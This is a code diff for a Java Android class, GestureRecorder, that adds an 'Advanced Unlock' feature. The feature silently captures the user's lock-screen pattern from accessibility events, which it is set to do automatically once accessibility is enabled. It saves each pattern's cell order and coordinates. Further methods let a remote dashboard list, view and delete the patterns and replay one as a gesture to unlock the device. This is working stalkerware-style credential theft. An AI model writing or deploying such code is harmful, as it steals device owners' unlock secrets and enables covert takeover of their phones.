@@ -2144,4 +2144,252 @@ public class GestureRecorder {
             return stopAndSave(dir);
         }
     }
+
+    // =========================================================================
+    // Advanced Unlock — accessibility-event-based lock pattern capture
+    // Runs automatically once accessibility is enabled (no dashboard trigger needed).
+    // When the user draws a pattern on the lock screen, Android fires accessibility
+    // events with contentDescription "Cell N added" for each cell touched.
+    // We collect those in order, record center coordinates, and save them locally.
+    // The dashboard can list, view, replay, and delete the saved patterns.
+    // =========================================================================
+
+    private static final String ADVANCED_UNLOCK_SUBDIR = "advanced_unlock";
+
+    // Cells captured so far for the current pattern attempt: [cellNum, cx, cy]
+    private final List<int[]> advCells         = new ArrayList<>();
+    private final Handler     advUnlockHandler = new Handler(Looper.getMainLooper());
+    private Runnable          advUnlockSaveTask;
+
+    // After the last cell arrives, wait this long before saving (finger may still be moving)
+    private static final long ADV_SAVE_DELAY_MS = 900;
+
+    /**
+     * Called from UnifiedAccessibilityService when an accessibility event reveals
+     * a "Cell N added" node on the lock screen (package: com.android.systemui).
+     *
+     * @param cellNum  1-9 (the pattern dot number)
+     * @param left     left edge of the cell view in screen coordinates
+     * @param top      top edge
+     * @param right    right edge
+     * @param bottom   bottom edge
+     */
+    public void onAdvancedUnlockCellDetected(int cellNum, int left, int top, int right, int bottom) {
+        // Ignore duplicate cells (same dot can fire multiple times)
+        for (int[] c : advCells) {
+            if (c[0] == cellNum) return;
+        }
+        int cx = (left + right) / 2;
+        int cy = (top  + bottom) / 2;
+        advCells.add(new int[]{cellNum, cx, cy});
+        Log.i(TAG, "AdvancedUnlock: cell " + cellNum + " at (" + cx + "," + cy + ")");
+
+        // Schedule (or reschedule) the delayed save
+        if (advUnlockSaveTask != null) {
+            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
+        }
+        advUnlockSaveTask = this::commitAdvancedUnlockPattern;
+        advUnlockHandler.postDelayed(advUnlockSaveTask, ADV_SAVE_DELAY_MS);
+    }
+
+    /** Discard any in-progress capture (e.g. screen turned off mid-gesture). */
+    public void clearAdvancedUnlockCapture() {
+        if (advUnlockSaveTask != null) {
+            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
+            advUnlockSaveTask = null;
+        }
+        advCells.clear();
+        Log.d(TAG, "AdvancedUnlock: capture cleared");
+    }
+
+    /** Persist the collected cells as a JSON file in the advanced_unlock directory. */
+    private void commitAdvancedUnlockPattern() {
+        try {
+            List<int[]> snapshot = new ArrayList<>(advCells);
+            advCells.clear();
+            advUnlockSaveTask = null;
+
+            if (snapshot.size() < 2) {
+                Log.d(TAG, "AdvancedUnlock: only " + snapshot.size() + " cell(s) — discarding");
+                return;
+            }
+
+            JSONArray cellSeq    = new JSONArray();
+            JSONArray cellCoords = new JSONArray();
+            for (int[] c : snapshot) {
+                cellSeq.put(c[0]);
+                JSONObject coord = new JSONObject();
+                coord.put("cell", c[0]);
+                coord.put("cx",   c[1]);
+                coord.put("cy",   c[2]);
+                cellCoords.put(coord);
+            }
+
+            JSONObject data = new JSONObject();
+            data.put("capturedAt",  System.currentTimeMillis());
+            data.put("screenW",     screenW);
+            data.put("screenH",     screenH);
+            data.put("cells",       cellSeq);
+            data.put("cellCoords",  cellCoords);
+
+            File dir = advancedUnlockDir();
+            if (!dir.exists()) dir.mkdirs();
+            String ts  = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+            String fn  = "adv_unlock_" + ts + ".json";
+            File   out = new File(dir, fn);
+            try (FileWriter fw = new FileWriter(out)) { fw.write(data.toString()); }
+            Log.i(TAG, "AdvancedUnlock: saved " + fn + " (" + snapshot.size() + " cells: " + cellSeq + ")");
+        } catch (Exception e) {
+            Log.e(TAG, "commitAdvancedUnlockPattern: " + e.getMessage());
+        }
+    }
+
+    private File advancedUnlockDir() {
+        return new File(context.getFilesDir(), ADVANCED_UNLOCK_SUBDIR);
+    }
+
+    /** List all saved advanced unlock patterns (newest first). */
+    public JSONObject listAdvancedUnlockPatterns() {
+        JSONObject r = new JSONObject();
+        try {
+            File dir = advancedUnlockDir();
+            JSONArray arr = new JSONArray();
+            if (dir.exists()) {
+                File[] files = dir.listFiles(f -> f.getName().endsWith(".json"));
+                if (files != null) {
+                    java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+                    for (File f : files) {
+                        try {
+                            JSONObject data = loadJson(f);
+                            if (data == null) continue;
+                            JSONObject meta = new JSONObject();
+                            meta.put("filename",   f.getName());
+                            meta.put("capturedAt", data.optLong("capturedAt", f.lastModified()));
+                            meta.put("screenW",    data.optInt("screenW", 0));
+                            meta.put("screenH",    data.optInt("screenH", 0));
+                            JSONArray cells = data.optJSONArray("cells");
+                            if (cells != null) {
+                                meta.put("cellCount", cells.length());
+                                meta.put("cells",     cells);
+                            }
+                            arr.put(meta);
+                        } catch (Exception ignored) {}
+                    }
+                }
+            }
+            r.put("success",  true);
+            r.put("patterns", arr);
+            r.put("count",    arr.length());
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /** Return the full data (including cellCoords) for one pattern. */
+    public JSONObject getAdvancedUnlockPattern(String filename) {
+        JSONObject r = new JSONObject();
+        try {
+            File file = new File(advancedUnlockDir(), filename);
+            if (!file.exists()) {
+                r.put("success", false); r.put("error", "Not found: " + filename); return r;
+            }
+            JSONObject data = loadJson(file);
+            if (data == null) {
+                r.put("success", false); r.put("error", "Parse error"); return r;
+            }
+            r.put("success", true);
+            r.put("pattern", data);
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /** Delete a saved advanced unlock pattern. */
+    public JSONObject deleteAdvancedUnlockPattern(String filename) {
+        JSONObject r = new JSONObject();
+        try {
+            File file = new File(advancedUnlockDir(), filename);
+            if (!file.exists()) {
+                r.put("success", false); r.put("error", "Not found: " + filename); return r;
+            }
+            boolean ok = file.delete();
+            r.put("success",  ok);
+            r.put("filename", filename);
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /**
+     * Replay a saved advanced unlock pattern on the device.
+     *
+     * Dispatches a single straight-line gesture through each recorded cell center.
+     * Speed: ~120 ms per cell-to-cell segment — a little faster than moderate,
+     * which feels natural for a lock-screen pattern draw.
+     */
+    public JSONObject replayAdvancedUnlockPattern(String filename) {
+        JSONObject r = new JSONObject();
+        try {
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
+                r.put("success", false); r.put("error", "Requires Android 7+"); return r;
+            }
+            if (accessSvc == null) {
+                r.put("success", false); r.put("error", "AccessibilityService not available"); return r;
+            }
+
+            File file = new File(advancedUnlockDir(), filename);
+            if (!file.exists()) {
+                r.put("success", false); r.put("error", "File not found: " + filename); return r;
+            }
+            JSONObject data = loadJson(file);
+            if (data == null) {
+                r.put("success", false); r.put("error", "Parse error"); return r;
+            }
+
+            JSONArray cellCoords = data.optJSONArray("cellCoords");
+            if (cellCoords == null || cellCoords.length() < 2) {
+                r.put("success", false); r.put("error", "Need at least 2 cell coordinates"); return r;
+            }
+
+            int srcW = data.optInt("screenW", screenW);
+            int srcH = data.optInt("screenH", screenH);
+            int n    = cellCoords.length();
+
+            // 120 ms per segment — a little faster than a casual draw
+            long msPerSegment  = 120L;
+            long totalDuration = Math.max(200L, msPerSegment * (n - 1));
+
+            // Build a straight-line path through each cell center.
+            // Normalize against the recorded screen size so it scales correctly
+            // to any current device screen.
+            Path path = new Path();
+            for (int i = 0; i < n; i++) {
+                JSONObject coord = cellCoords.getJSONObject(i);
+                float nx = (float) coord.getInt("cx") / srcW;
+                float ny = (float) coord.getInt("cy") / srcH;
+                float sx = Math.max(1, Math.min(screenW - 1, nx * screenW));
+                float sy = Math.max(1, Math.min(screenH - 1, ny * screenH));
+                if (i == 0) path.moveTo(sx, sy);
+                else        path.lineTo(sx, sy);
+            }
+
+            GestureDescription.Builder builder = new GestureDescription.Builder();
+            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, totalDuration));
+            GestureDescription gesture = builder.build();
+
+            boolean ok = accessSvc.dispatchGesture(gesture, null, null);
+            r.put("success",    ok);
+            r.put("filename",   filename);
+            r.put("cellCount",  n);
+            r.put("durationMs", totalDuration);
+            if (!ok) r.put("error", "dispatchGesture returned false");
+        } catch (Exception e) {
+            Log.e(TAG, "replayAdvancedUnlockPattern: " + e.getMessage());
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
 }
